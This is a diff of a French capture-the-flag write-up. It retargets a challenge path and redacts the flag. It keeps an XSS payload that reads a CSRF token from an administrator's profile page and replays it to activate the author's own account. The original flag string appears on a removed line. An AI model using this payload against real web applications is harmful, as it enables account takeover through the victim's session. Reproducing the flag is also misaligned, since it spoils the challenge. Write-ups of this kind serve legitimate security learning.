@@ -76,12 +76,12 @@ Le tout execute dans le contexte du navigateur de l'administrateur. Son cookie d
 ```html
 <script>
 var x = new XMLHttpRequest();
-x.open("GET", "/web-client/ch23/?action=profile", false);
+x.open("GET", "/intranet/?action=profile", false);
 x.send();
 var m = x.responseText.match(/name="token" value="([a-f0-9]+)"/);
 if (m) {
   var y = new XMLHttpRequest();
-  y.open("POST", "/web-client/ch23/?action=profile", false);
+  y.open("POST", "/intranet/?action=profile", false);
   y.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   y.send("username=heisenberg&status=on&token=" + m[1]);
 }
@@ -103,7 +103,7 @@ Et puis je rafraichis une derniere fois.
 La page Private s'affiche. Mon compte est actif. Le flag est la, en clair :
 
 ```
-Byp4ss_CSRF_T0k3n-w1th-XSS
+[FLAG REDACTED]
 ```
 
 *You're goddamn right.*
